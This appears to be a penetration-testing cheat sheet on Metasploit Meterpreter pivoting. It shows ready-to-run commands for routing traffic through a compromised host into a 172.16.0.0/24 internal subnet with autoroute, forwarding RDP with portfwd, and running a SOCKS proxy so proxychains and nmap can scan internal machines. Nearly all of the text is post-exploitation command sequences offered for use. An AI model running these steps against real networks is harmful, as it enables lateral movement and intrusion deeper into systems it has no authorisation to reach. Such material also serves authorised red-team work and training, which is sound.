# Meterpreter Pivoting and Routing

Using a compromised host with a Meterpreter session to route traffic into internal networks.

## Setup Autoroute

Add a route to the internal subnet through the compromised session.
```bash
# Inside meterpreter
run autoroute -s 172.16.0.0/24
run autoroute -p  # Print active routes

# Alternatively, from msfconsole:
use post/multi/manage/autoroute
set SESSION 1
run
```

## Port Forwarding

Forward a local port to a remote host and port accessible from the compromised machine.
```bash
# Inside meterpreter
# Forward local port 3389 to 172.16.0.10:3389 through the session
portfwd add -l 3389 -p 3389 -r 172.16.0.10

# List active port forwards
portfwd list

# Now connect locally:
# xfreerdp /v:127.0.0.1
```

## SOCKS Proxy (Proxychains)

Start a SOCKS proxy to route external tools (nmap, curl, etc.) through the Meterpreter session.
```bash
# Inside msfconsole
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j
```

Configure `/etc/proxychains.conf` or `/etc/proxychains4.conf` to use `socks4 127.0.0.1 1080`.
```bash
proxychains nmap -sT -Pn -p445 172.16.0.10
```
*(Note: Nmap must use `-sT` (TCP connect scan) when routing through proxychains).*
